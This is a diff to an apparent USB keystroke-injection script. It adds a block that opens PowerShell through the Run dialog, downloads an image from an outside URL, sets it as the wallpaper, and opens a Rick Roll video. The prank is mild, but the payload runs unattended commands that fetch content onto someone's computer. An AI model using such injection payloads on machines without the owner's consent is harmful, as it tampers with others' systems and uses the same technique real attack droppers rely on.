@@ -15,4 +15,9 @@ SPACE
 ALT y
 REM Clean up
 ALT F4
-  
+REM post injection
+GUI r
+STRING powershell
+ENTER
+STRING Add-Type -TypeDefinition \"using System;using System.Runtime.InteropServices;public class Wallpaper{[DllImport(\\\"user32.dll\\\",CharSet=CharSet.Unicode)]public static extern int SystemParametersInfo(Int32 uAction,Int32 uParam,String lpvParam,Int32 fuWinIni);}\";$img='https://th.bing.com/th/id/OIP.UH7U03jGe2GBQzQNxWncdgHaGV?w=205&h=180&c=7&r=0&o=7&pid=1.7&rm=3';$wc=New-Object Net.WebClient;$path=$env:TEMP+'\\rick.jpg';$wc.DownloadFile($img,$path);[Wallpaper]::SystemParametersInfo(20,0,$path,3);Start-Process 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'
+ENTER
